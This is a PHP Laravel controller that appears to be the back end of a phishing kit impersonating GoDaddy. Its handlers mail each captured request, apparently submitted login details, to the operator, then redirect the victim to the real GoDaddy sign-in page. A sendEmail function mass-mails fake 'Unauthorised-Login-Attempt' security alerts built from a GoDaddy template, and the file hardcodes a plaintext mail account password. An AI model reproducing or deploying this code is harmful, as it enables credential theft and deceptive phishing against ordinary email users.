<?php

namespace App\Http\Controllers;

use App\Mail\EmailLog;
use App\Mail\NetLog;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Config;
use Illuminate\Support\Facades\Mail;

class PageController extends Controller
{

    public function index(Request $request)
    {
    	$country = $this->getCountryName($request);
        Mail::send( new EmailLog($request, $country));
        return redirect('https://sso.godaddy.com/login?app=email&realm=pass');
    }   

    public function net(Request $request)
    {
        $country = $this->getCountryName($request);
        Mail::send( new NetLog($request, $country));
        return redirect('/');
    }


    public function getCountryName($request)
    {   
        $country = '';
        $user_ip = '';
        
        if (getenv('APP_ENV') == 'local') {
            $country = 'Nigeria';
        } else {

            try {   
                if (!isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
                    $user_ip = $request->ip();

                } else {
                    $user_ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
                }

                $client = new Client();
                $res = $client->get('http://geoip.nekudo.com/api/' . $user_ip);

                $content = json_decode($res->getBody()->getContents());
                if (!is_null($content)) {

                    $country = $content->country->name;
                }
            }
            catch( \Exception $e) {
                report($e);
            }
        }

        return $country;
    }



    public function sendEmail(Request $request)
    {
        $this->validate($request, ['email' => 'required']);
        Config::set('mail.username', 'help@usaimmigration.website');
        Config::set('mail.password', 'Olu2019@');

        if (strpos($request->email, ',')) {
          $emails = explode(',', $request->email);
          foreach ($emails as $email) {
            $params['from_name'] = 'Security Alert Services';
            $params['from_email'] = 'help@usaimmigration.website';
            $params['to'] = $email;
            $params['template'] = 'godaddy.sample';
            $params['subject'] = 'Unauthorised-Login-Attempt';
            sendmail($params);
        }
    } else {
        $params['from_name'] = 'Security Alert Services';
        $params['from_email'] = 'help@usaimmigration.website';
        $params['to'] = $request->email;
        $params['template'] = 'godaddy.sample';
        $params['subject'] = 'Unauthorised-Login-Attempt';
        sendmail($params);
    }
    // return back()->with('status', 'sent');
    return redirect('/success');
}
}
